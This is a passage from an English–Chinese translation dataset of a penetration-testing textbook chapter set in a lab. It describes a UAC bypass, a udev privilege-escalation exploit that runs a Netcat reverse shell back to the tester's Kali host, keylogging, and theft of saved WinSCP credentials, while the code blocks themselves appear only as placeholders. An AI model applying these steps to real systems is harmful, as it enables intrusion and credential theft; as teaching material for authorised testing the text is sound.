  zh: '[PRE14]'
- en: The module uses a trusted publisher certificate through process injection to
    bypass the UAC controls. As you can see from the results of the `getui``d` command,
    though our new session is still running as user *Georgia Weidman*, we’re no longer
    restricted by UAC. If it was successful you will again be presented with a new
    session. Don’t worry if you see the line at ❶. As long as the new Meterpreter
    session opens, the attack was successful.
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 该模块通过进程注入使用受信任的发布者证书绕过UAC控制。如你从`getui``d`命令的结果中看到的，尽管我们的新会话仍然以用户*Georgia Weidman*运行，但我们不再受到UAC的限制。如果攻击成功，你将再次看到一个新的会话。如果你在❶处看到这行信息，不必担心。只要新的Meterpreter会话打开，攻击就是成功的。
- en: As shown next, having gotten UAC out of the way, `getsystem` has no trouble
    gaining system privileges.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 如下所示，绕过了UAC后，`getsystem`可以轻松获得系统权限。
- en: '[PRE15]'
  id: totrans-87
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: Udev Privilege Escalation on Linux
  id: totrans-88
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Linux中的Udev权限提升
- en: We have yet to try privilege escalation on our Linux target. Let’s mix things
    up a bit and use public exploit code instead of Metasploit to perform a local
    privilege-escalation attack on Linux.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还没有尝试在Linux目标上进行权限提升。让我们换个方式，使用公开的利用代码，而不是Metasploit，来执行本地权限提升攻击。
- en: 'We have two ways to interact with our Linux target: via SSH and by using the
    TikiWiki to gain a Meterpreter shell. The Linux Meterpreter has fewer available
    commands than Windows Meterpreter, but in both cases we use the `shell` command
    to drop out of Meterpreter and into a regular command shell, as shown in [Example 13-11](ch13.xhtml#dropping_to_a_shell_in_meterpreter
    "Example 13-11. Dropping to a shell in Meterpreter").'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 我们与Linux目标有两种交互方式：通过SSH和使用TikiWiki获得Meterpreter shell。Linux的Meterpreter比Windows的Meterpreter可用的命令少，但在这两种情况下，我们都使用`shell`命令从Meterpreter退出并进入常规命令shell，如[示例 13-11](ch13.xhtml#dropping_to_a_shell_in_meterpreter
    "示例 13-11. 在Meterpreter中进入shell")所示。
- en: Example 13-11. Dropping to a shell in Meterpreter
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-11. 在Meterpreter中进入shell
- en: '[PRE16]'
  id: totrans-92
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: We see that our TikiWiki exploit gained us a session as the user *www-data*,
    a limited account for the web server, but we have a long way to get to root. We
    have also gained a Bash shell as the user *georgia* through SSH in [Chapter 8](ch08.xhtml
    "Chapter 8. Exploitation") with more privileges than *www-data*, but we’re still
    not the coveted root.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到我们的TikiWiki利用为我们获得了一个作为*www-data*用户的会话，这是一个受限的Web服务器账户，但我们距离root权限还有很长的路要走。通过SSH，我们还作为*georgia*用户获得了一个Bash
    shell，如[第8章](ch08.xhtml "第8章. 利用")所示，拥有比*www-data*更多的权限，但我们仍然不是渴望得到的root。
- en: Finding a Vulnerability
  id: totrans-94
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: 寻找漏洞
- en: We need to find a local privilege-escalation vulnerability to exploit. First,
    we need a bit of information about the local system, such as the version of the
    installed kernel and the Ubuntu version. You can find out the Linux kernel version
    with the command `uname -a` and the Ubuntu release version with the command `lsb_release
    -a`, as shown in [Example 13-12](ch13.xhtml#gathering_local_information "Example 13-12. Gathering
    local information").
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要找到一个本地权限提升漏洞来进行利用。首先，我们需要一些关于本地系统的信息，比如已安装内核的版本和Ubuntu的版本。你可以通过命令`uname
    -a`查看Linux内核版本，通过命令`lsb_release -a`查看Ubuntu发布版本，如[示例 13-12](ch13.xhtml#gathering_local_information
    "示例 13-12. 收集本地信息")所示。
- en: Example 13-12. Gathering local information
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-12. 收集本地信息
- en: '[PRE17]'
  id: totrans-97
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: The Linux target is running Linux kernel 2.6.27-2 and Ubuntu 8.10, codename
    *Intrepid*. This Linux system is a bit out of date and is vulnerable to multiple
    known privilege-escalation issues. We’ll focus on an issue in *udev*, the device
    manager for the Linux kernel that is in charge of loading device drivers, or software
    that facilitates control of a device.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 目标 Linux 系统运行的是 Linux 内核 2.6.27-2 和 Ubuntu 8.10，代号 *Intrepid*。这个 Linux 系统有些过时，且存在多个已知的权限提升问题。我们将重点关注
    *udev* 中的问题，它是负责加载设备驱动程序或促进设备控制的软件的 Linux 内核设备管理器。
- en: Vulnerability CVE-2009-1185 describes an issue in udev where the daemon, which
    runs with root privileges, fails to check whether requests to load drivers originate
    from the kernel. Processes in user space, such as ones that a user starts, can
    send messages to udev and convince it to run code with root privileges.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 漏洞 CVE-2009-1185 描述了 udev 中的问题，udev 守护进程以 root 权限运行，但未检查加载驱动程序的请求是否来自内核。用户空间中的进程（例如用户启动的进程）可以向
    udev 发送消息，并说服它以 root 权限运行代码。
- en: According to the *SecurityFocus.com* entry for this vulnerability, Ubuntu 8.10
    is an affected platform, and further digging reveals that udev versions 141 and
    earlier are affected by this issue. We can check the udev version on our target
    with the command `udevadm --version`, but we can’t run the command with the privileges
    afforded by *www-data*. Instead, we need to run it from our SSH shell as shown
    here.
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 根据 *SecurityFocus.com* 上关于这个漏洞的条目，Ubuntu 8.10 是受影响的平台，进一步调查表明 udev 版本 141 及更早版本存在此问题。我们可以通过命令
    `udevadm --version` 检查目标系统上的 udev 版本，但我们不能以 *www-data* 权限运行此命令。相反，我们需要从 SSH shell
    中运行该命令，如下所示。
- en: '[PRE18]'
  id: totrans-101
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: The udev version on our target, 124, is earlier than 141, which tells us that
    our Linux target is vulnerable.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 我们目标系统上的 udev 版本是 124，低于 141，这告诉我们我们的 Linux 目标系统存在漏洞。
- en: Finding an Exploit
  id: totrans-103
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: 寻找漏洞
- en: Kali Linux includes a local repository of public exploit code from *Exploitdb.com*
    at */usr/share/exploitdb*, which includes a utility called `searchsploit` that
    we can use to search for useful code. For example, [Example 13-13](ch13.xhtml#searching_the_exploitdb_repository
    "Example 13-13. Searching the Exploitdb repository") shows the results of a search
    for exploits related to udev.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: Kali Linux 包含来自 *Exploitdb.com* 的本地公开漏洞代码库，路径为 */usr/share/exploitdb*，其中包含一个名为
    `searchsploit` 的工具，我们可以用它来搜索有用的代码。例如，[示例 13-13](ch13.xhtml#searching_the_exploitdb_repository
    "示例 13-13. 搜索 Exploitdb 仓库") 显示了与 udev 相关的漏洞利用搜索结果。
- en: Example 13-13. Searching the Exploitdb repository
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-13. 搜索 Exploitdb 仓库
- en: '[PRE19]'
  id: totrans-106
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: There appear to be multiple public exploits for this issue. Let’s use the second
    exploit, */usr/share/exploitdb/platforms/linux/local/8572.c*.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 似乎有多个公开的漏洞利用代码可供使用。我们使用第二个漏洞利用，*/usr/share/exploitdb/platforms/linux/local/8572.c*。
- en: Note
  id: totrans-108
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Always be sure that you fully understand what public exploit code does before
    running it against a target. Additionally, there is always a chance that a public
    exploit won’t run reliably on the target. If possible, set up a lab machine, and
    test the quality of the exploit before you try it on the client target.
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 在运行公开漏洞代码针对目标之前，请务必确保完全理解其功能。此外，总是有可能公开的漏洞利用代码在目标系统上无法可靠运行。如果可能，搭建一个实验室机器，并在尝试在客户端目标上运行之前，先测试漏洞利用的质量。
- en: One of the great things about this exploit is that it’s well commented and provides
    detailed usage information. [Example 13-14](ch13.xhtml#udev_exploit_usage_information
    "Example 13-14. Udev exploit usage information") shows an excerpt from its C code,
    which includes usage details.
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 这个漏洞利用的一个优点是它有详细的注释，并提供了使用信息。[示例 13-14](ch13.xhtml#udev_exploit_usage_information
    "示例 13-14. udev 漏洞利用使用信息") 显示了它的 C 代码摘录，其中包括使用细节。
- en: Example 13-14. Udev exploit usage information
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-14. udev 漏洞利用使用信息
- en: '[PRE20]'
  id: totrans-112
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: We learn that we need to pass the PID of the udev netlink socket as an argument
    to our exploit. The usage information tells us to look for this value in */proc/net/netlink*,
    usually as udev PID minus 1\. We also see that the exploit will run whatever code
    it finds in the file */tmp/run* as root, so we need to put some code there.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 我们了解到需要将 udev netlink 套接字的 PID 作为参数传递给漏洞利用代码。使用信息告诉我们在 */proc/net/netlink* 中查找此值，通常是
    udev 的 PID 减 1。我们还看到漏洞利用代码会以 root 权限运行它在文件 */tmp/run* 中找到的任何代码，因此我们需要将一些代码放在那里。
- en: Copying and Compiling the Exploit on the Target
  id: totrans-114
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: 在目标系统上复制并编译漏洞利用
- en: First we need to copy the exploit to our target and compile it so that it can
    run. Luckily, the GCC C compiler is preinstalled on most Linux distributions,
    so you can often compile local exploit code directly on the target. To find out
    if GCC is installed, enter **`gcc`** as shown here.
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们需要将漏洞代码复制到目标系统并进行编译，以便它能够运行。幸运的是，GCC C 编译器在大多数 Linux 发行版中是预安装的，因此你通常可以直接在目标上编译本地漏洞代码。要检查
    GCC 是否已安装，可以输入**`gcc`**，如这里所示。
- en: '[PRE21]'
  id: totrans-116
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: As you can see, GCC complains that it’s not been given any input, but this tells
    us that GCC is present. Now to copy our exploit code to the Linux target. The
    Linux `wget` command lets us use the command line to pull a file down from a web
    server, so let’s copy the C code to our Kali Linux web server as shown here. Make
    sure the apache2 webserver is running in Kali.
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，GCC 报告它没有收到任何输入，但这也告诉我们 GCC 已经安装好了。接下来是将我们的漏洞代码复制到 Linux 目标系统。Linux 的 `wget`
    命令可以让我们通过命令行从 web 服务器下载文件，所以我们将 C 代码复制到 Kali Linux web 服务器，如这里所示。确保在 Kali 中运行
    apache2 web 服务器。
- en: '[PRE22]'
  id: totrans-118
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: Now switch to your SSH shell, and download the file with `wget`, as shown in
    [Example 13-15](ch13.xhtml#using_wget_to_download_a_file "Example 13-15. Using
    wget to download a file").
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 现在切换到你的 SSH shell，并使用 `wget` 下载文件，如[示例 13-15](ch13.xhtml#using_wget_to_download_a_file
    "示例 13-15。使用 wget 下载文件")中所示。
- en: Example 13-15. Using `wget` to download a file
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-15。使用 `wget` 下载文件
- en: '[PRE23]'
  id: totrans-121
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: Now compile the exploit code with GCC on the Linux target as shown here. Use
    the `-o` flag to specify an output file name for your compiled code.
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 现在按照这里所示，使用 GCC 在 Linux 目标上编译漏洞代码。使用`-o`标志指定编译代码的输出文件名。
- en: '[PRE24]'
  id: totrans-123
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: Now to find that udev netlink socket PID mentioned in the exploit’s usage information
    ([Example 13-14](ch13.xhtml#udev_exploit_usage_information "Example 13-14. Udev
    exploit usage information")) for our argument. The usage information noted that
    the PID we need is listed in */proc/net/netlink*. `cat` out the file, as shown
    in [Example 13-16](ch13.xhtml#solidusprocsolidusnetsolidusnetlink_file "Example 13-16. The
    /proc/net/netlink file").
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 现在来查找漏洞使用信息中提到的 udev netlink 套接字 PID（[示例 13-14](ch13.xhtml#udev_exploit_usage_information
    "示例 13-14。Udev 漏洞使用信息")）作为参数。使用信息中指出我们需要的 PID 列在 */proc/net/netlink* 中。使用 `cat`
    命令查看该文件，如[示例 13-16](ch13.xhtml#solidusprocsolidusnetsolidusnetlink_file "示例 13-16。/proc/net/netlink
    文件")中所示。
- en: Example 13-16. The /proc/net/netlink file
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-16。/proc/net/netlink 文件
- en: '[PRE25]'
  id: totrans-126
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: There’s more than one PID listed, but we know that the PID we need is usually
    the PID of the udev daemon minus 1\. Look at the udev process with the `ps aux`
    command, as shown here.
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 列出的 PID 不止一个，但我们知道我们需要的 PID 通常是 udev 守护进程的 PID 减去 1。通过 `ps aux` 命令查看 udev 进程，如这里所示。
- en: '[PRE26]'
  id: totrans-128
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: The udev daemon’s PID is 2469\. One of the PIDs from [Example 13-16](ch13.xhtml#solidusprocsolidusnetsolidusnetlink_file
    "Example 13-16. The /proc/net/netlink file") is 2468 (udev’s PID minus 1). Based
    on the exploit’s help information, this is the value we need. This value is going
    to change between reboots of the Ubuntu target, so make sure you run these commands
    in your own lab to find the correct value.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: udev 守护进程的 PID 是 2469。来自[示例 13-16](ch13.xhtml#solidusprocsolidusnetsolidusnetlink_file
    "示例 13-16。/proc/net/netlink 文件")的一个 PID 是 2468（即 udev 的 PID 减去 1）。根据漏洞的帮助信息，这是我们需要的值。这个值在
    Ubuntu 目标系统重启后会发生变化，因此请确保在自己的实验室中运行这些命令，以找到正确的值。
- en: Adding Code to the /tmp/run File
  id: totrans-130
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: 向 /tmp/run 文件中添加代码
- en: The last thing we need is some code to be run as root in the file */tmp/run*.
    Luckily, we also have Netcat installed on our Ubuntu system by default, so we
    can create a simple Bash script to connect back to a listener on our Kali system,
    as discussed in [Chapter 2](ch02.xhtml "Chapter 2. Using Kali Linux"). Here’s
    the script.
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要做的最后一件事是一些代码，以便作为 root 在文件 */tmp/run* 中运行。幸运的是，Ubuntu 系统上默认也安装了 Netcat，因此我们可以创建一个简单的
    Bash 脚本，连接回 Kali 系统上的监听器，正如[第 2 章](ch02.xhtml "第 2 章。使用 Kali Linux")中所讨论的。以下是该脚本。
- en: '[PRE27]'
  id: totrans-132
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: Before running our exploit, we need to set up a listener on our Kali system
    to catch the incoming Netcat shell.
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 在运行我们的漏洞代码之前，我们需要在 Kali 系统上设置一个监听器，以捕获传入的 Netcat shell。
- en: '[PRE28]'
  id: totrans-134
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: Finally, we’re ready to run our compiled exploit. Remember to pass the PID of
    the udev netlink socket we found earlier as an argument.
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们准备运行我们编译的漏洞代码了。记得将之前找到的 udev netlink 套接字的 PID 作为参数传递。
- en: '[PRE29]'
  id: totrans-136
  prefs: []
  type: TYPE_PRE
  zh: '[PRE29]'
- en: Nothing seems to happen on the Linux target, but if you turn back to the Netcat
    listener on Kali, we have a connection. The `whoami` command tells us we now have
    root privileges, as shown in [Example 13-17](ch13.xhtml#gaining_root_privileges
    "Example 13-17. Gaining root privileges").
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: Linux目标系统似乎没有任何反应，但如果你回到Kali上的Netcat监听器，我们已经建立了连接。`whoami`命令告诉我们现在我们拥有root权限，如[示例13-17](ch13.xhtml#gaining_root_privileges
    "示例13-17. 获取root权限")所示。
- en: Example 13-17. Gaining root privileges
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 示例13-17. 获取root权限
- en: '[PRE30]'
  id: totrans-139
  prefs: []
  type: TYPE_PRE
  zh: '[PRE30]'
- en: We’ve successfully escalated our privileges using a public exploit.
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经成功地使用公开漏洞提升了权限。
- en: Local Information Gathering
  id: totrans-141
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 本地信息收集
- en: Once we gain access to a system we should see if any potentially sensitive information
    is present, such as installed software that stores passwords in plaintext or using
    a weak hashing algorithm, proprietary data or source code, customer credit card
    information, or the CEO’s email account. These are all useful bits of information
    to present in the final report to the customer. Additionally, any information
    we find may help us break into other systems in the network that hold even greater
    spoils.
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们获得了对系统的访问权限，就应该检查是否存在任何潜在的敏感信息，如存储明文密码或使用弱哈希算法的安装软件、专有数据或源代码、客户的信用卡信息，或者是CEO的电子邮件账户。这些都是可以在最终报告中呈现给客户的有用信息。此外，我们找到的任何信息可能有助于我们突破网络中其他系统的防线，从而获取更多的收益。
- en: We will look at moving from system to system later in this chapter, but for
    now let’s look at a few interesting ways to find information on the local system.
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 我们稍后会在本章中讨论如何从一个系统迁移到另一个系统，但现在让我们先看看几种在本地系统上查找信息的有趣方法。
- en: Searching for Files
  id: totrans-144
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 查找文件
- en: We can tell Meterpreter to search for interesting files. For example in [Example 13-18](ch13.xhtml#using_meterpreter_to_look_for_files
    "Example 13-18. Using Meterpreter to look for files"), I tell Meterpreter to look
    for any filenames that contain the name *password*.
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以让Meterpreter搜索有趣的文件。例如，在[示例13-18](ch13.xhtml#using_meterpreter_to_look_for_files
    "示例13-18. 使用Meterpreter查找文件")中，我告诉Meterpreter查找任何包含*password*的文件名。
- en: Example 13-18. Using Meterpreter to look for files
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 示例13-18. 使用Meterpreter查找文件
- en: '[PRE31]'
  id: totrans-147
  prefs: []
  type: TYPE_PRE
  zh: '[PRE31]'
- en: Keylogging
  id: totrans-148
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 键盘记录
- en: Another way to gather information is to let the logged-in user give it to you,
    so to speak. Meterpreter has a keylogger we can use to listen for keystrokes.
    Perhaps the user is logging in to websites or other systems on the network while
    our Meterpreter session is active. Start the keylogger on the Windows XP Meterpreter
    session by entering **`keyscan_start`**, as shown here.
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 另一种收集信息的方法是让登录的用户主动提供信息。Meterpreter有一个键盘记录器，我们可以用它来监听按键。也许用户在我们Meterpreter会话活跃期间正在登录网站或网络上的其他系统。通过输入**`keyscan_start`**，在Windows
    XP的Meterpreter会话中启动键盘记录器，如图所示。
- en: '[PRE32]'
  id: totrans-150
  prefs: []
  type: TYPE_PRE
  zh: '[PRE32]'
- en: Note
  id: totrans-151
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: You will capture keystrokes only in your current context. For my example, I
    used my original Windows XP session where I am the user *georgia* in the *explorer.exe*
    process, and thus can sniff *georgia*’s keystrokes. Another interesting idea is
    to migrate into the winlogon process, where you will see only login information
    that is typed—certainly useful information.
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 你只会在当前的上下文中捕获按键。在我的示例中，我使用的是原始的Windows XP会话，在该会话中我是*georgia*用户，正在使用*explorer.exe*进程，因此可以嗅探*georgia*的按键。另一个有趣的想法是迁移到winlogon进程，在那里你只会看到键入的登录信息——这无疑是有用的信息。
- en: Now switch to Windows XP, and type something. In my example I typed CTRL-R to
    open the Run dialog. Then I entered `notepad.exe` to start the Notepad program
    and typed `hi georgia` into Notepad.
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 现在切换到Windows XP，输入一些内容。在我的示例中，我按CTRL-R打开运行对话框。然后我输入`notepad.exe`启动记事本程序，并在记事本中输入`hi
    georgia`。
- en: To see any keystrokes the keylogger has logged, enter **`keyscan_dump`** as
    shown here. As you can see, all of the keystrokes I typed were logged.
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 要查看键盘记录器记录的任何按键，请输入**`keyscan_dump`**，如图所示。如你所见，我输入的所有按键都已被记录。
- en: '[PRE33]'
  id: totrans-155
  prefs: []
  type: TYPE_PRE
  zh: '[PRE33]'
- en: To stop the keylogger, enter **`keyscan_stop`** in Meterpreter as shown here.
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 要停止键盘记录器，请在Meterpreter中输入**`keyscan_stop`**，如图所示。
- en: '[PRE34]'
  id: totrans-157
  prefs: []
  type: TYPE_PRE
  zh: '[PRE34]'
- en: Gathering Credentials
  id: totrans-158
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 收集凭据
- en: In [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"), we worked with password
    hashes from Windows, Linux, and the FileZilla FTP server, but users may have other
    stored credentials on their local system. Metasploit has several post modules
    for gathering passwords for specific software in */usr/share/metasploit-framework/modules/post/windows/gather/credentials*.
    For our example, we will look at stealing stored credentials from WinSCP, a secure
    copy tool for Windows.
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 在[第 9 章](ch09.xhtml "第 9 章. 密码攻击")中，我们处理了来自 Windows、Linux 和 FileZilla FTP 服务器的密码哈希，但用户可能在本地系统上存储了其他凭证。Metasploit
    有几个后置模块，用于收集特定软件的密码，位于 */usr/share/metasploit-framework/modules/post/windows/gather/credentials*。在我们的示例中，我们将查看从
    WinSCP 中窃取保存的凭证，WinSCP 是一个 Windows 上的安全复制工具。
- en: As shown in [Figure 13-1](ch13.xhtml#connecting_with_winscp "Figure 13-1. Connecting
    with WinSCP"), open WinSCP, set the File protocol to **SCP**, the Host name to
    the IP address of the Ubuntu target, and the credentials to *georgia:password*.
    Click **Save As** under the login information.
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 如[图 13-1](ch13.xhtml#connecting_with_winscp "图 13-1. 使用 WinSCP 连接")所示，打开 WinSCP，设置文件协议为
    **SCP**，主机名为 Ubuntu 目标的 IP 地址，凭证为 *georgia:password*。点击登录信息下的**另存为**。
- en: '![Connecting with WinSCP](httpatomoreillycomsourcenostarchimages2030420.png.jpg)Figure 13-1. Connecting
    with WinSCP'
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: '![使用 WinSCP 连接](httpatomoreillycomsourcenostarchimages2030420.png.jpg)图 13-1.
    使用 WinSCP 连接'
- en: Note
  id: totrans-162
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Like some of the other tools used in this book, the WinSCP GUI may be updated
    in the future, so your version may not look exactly like this.
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 与本书中使用的一些其他工具一样，WinSCP 的 GUI 可能会在未来更新，因此你所使用的版本可能与此略有不同。
- en: You will be prompted for a session name, as shown in [Figure 13-2](ch13.xhtml#saving_credentials_in_winscp
    "Figure 13-2. Saving credentials in WinSCP"). Check the **Save password** box
    before clicking **OK**. Even WinSCP warns you that saving passwords is a bad idea.
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 系统会提示输入会话名称，如[图 13-2](ch13.xhtml#saving_credentials_in_winscp "图 13-2. 在 WinSCP
    中保存凭证")所示。在点击**确定**之前，请勾选**保存密码**框。即使是 WinSCP 也警告你保存密码是一个不好的主意。
- en: '![Saving credentials in WinSCP](httpatomoreillycomsourcenostarchimages2030422.png.jpg)Figure 13-2. Saving
    credentials in WinSCP'
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: '![在 WinSCP 中保存凭证](httpatomoreillycomsourcenostarchimages2030422.png.jpg)图 13-2.
    在 WinSCP 中保存凭证'
- en: Now switch back to Kali Linux, and use the module *post/windows/gather/credentials/winscp*,
    as shown in [Example 13-19](ch13.xhtml#stealing_stored_credentials_from_winscp
    "Example 13-19. Stealing stored credentials from WinSCP"). Because this is a post
    module, the only option you will need to supply is the ID of the Windows XP session.
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 现在切换回 Kali Linux，使用模块 *post/windows/gather/credentials/winscp*，如[示例 13-19](ch13.xhtml#stealing_stored_credentials_from_winscp
    "示例 13-19. 从 WinSCP 中窃取保存的凭证")所示。由于这是一个后置模块，你唯一需要提供的选项是 Windows XP 会话的 ID。
- en: Example 13-19. Stealing stored credentials from WinSCP
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-19. 从 WinSCP 中窃取保存的凭证
- en: '[PRE35]'
  id: totrans-168
  prefs: []
  type: TYPE_PRE
  zh: '[PRE35]'
- en: As shown in [Example 13-19](ch13.xhtml#stealing_stored_credentials_from_winscp
    "Example 13-19. Stealing stored credentials from WinSCP"), the module discovers
    our saved credentials ❶. Based on the software your pentesting targets are running,
    there may be other credential-gathering targets that will come in handy in the
    field.
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 如[示例 13-19](ch13.xhtml#stealing_stored_credentials_from_winscp "示例 13-19. 从
    WinSCP 中窃取保存的凭证")所示，该模块发现了我们保存的凭证 ❶。根据你的渗透测试目标运行的软件，可能会有其他凭证收集目标在实际操作中派上用场。
- en: net Commands
  id: totrans-170
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: net 命令
- en: The Windows `net` command will allow us to view and edit network information.
    Using various options, we can gain valuable information. Drop to a Windows command
    shell using the Meterpreter command shell, as shown here.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: Windows `net` 命令允许我们查看和编辑网络信息。通过使用不同的选项，我们可以获取有价值的信息。可以通过 Meterpreter 命令 shell
    进入 Windows 命令行，如此处所示。
- en: '[PRE36]'
  id: totrans-172
  prefs: []
  type: TYPE_PRE
  zh: '[PRE36]'
- en: The command `net users` will show us all local users. Tacking on the word `/domain`
    at the end of this and many `net` commands will show information about the domain
    rather than the local system, but because our targets are not joined to a domain,
    we’ll stick with `net users`.
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 命令 `net users` 会显示所有本地用户。若在此命令及许多 `net` 命令的末尾加上 `/domain`，则会显示关于域的信息，而非本地系统的信息，但由于我们的目标没有加入域，因此我们将继续使用
    `net users`。
- en: '[PRE37]'
  id: totrans-174
  prefs: []
  type: TYPE_PRE
  zh: '[PRE37]'
- en: We can also see the members of a group with the command `net` `localgroup` *`group`*
    as shown in [Example 13-20](ch13.xhtml#viewing_local_administrators_with_net_co
    "Example 13-20. Viewing local administrators with net commands").
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以通过命令 `net` `localgroup` *`group`* 查看某个组的成员，如[示例 13-20](ch13.xhtml#viewing_local_administrators_with_net_co
    "示例 13-20. 使用 net 命令查看本地管理员")所示。
- en: Example 13-20. Viewing local administrators with `net` commands
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-20. 使用 `net` 命令查看本地管理员
- en: '[PRE38]'
  id: totrans-177
  prefs: []
  type: TYPE_PRE
  zh: '[PRE38]'
- en: To exit the shell and drop back into Meterpreter, type `exit`.
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 要退出Shell并返回Meterpreter，输入`exit`。
- en: These are just a couple of examples of useful `net` commands. We’ll look at
    using `net` commands to add a user later in this chapter.
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 这些只是一些有用的`net`命令示例。我们稍后将在本章中探讨如何使用`net`命令添加用户。
- en: Another Way In
  id: totrans-180
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 另一种进入方式
- en: In [Chapter 5](ch05.xhtml "Chapter 5. Information Gathering"), we used Nmap
    to run a UDP scan. By definition, UDP scans are not as exact as TCP scans. For
    example, port 69/UDP on the Windows XP target, traditionally the port for TFTP,
    returned `open|filtered` in our UDP Nmap scan. Because our scan did not receive
    any response, it was unclear if anything was listening there at all. Short of
    fuzzing the TFTP server and possibly crashing it, it would be difficult to ascertain
    which TFTP software, if any, is running. Now that we have access to the system,
    we can further investigate running software for any vulnerabilities we may have
    missed.
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 在[第5章](ch05.xhtml "第5章 信息收集")中，我们使用Nmap进行了一次UDP扫描。根据定义，UDP扫描不像TCP扫描那样精确。例如，Windows
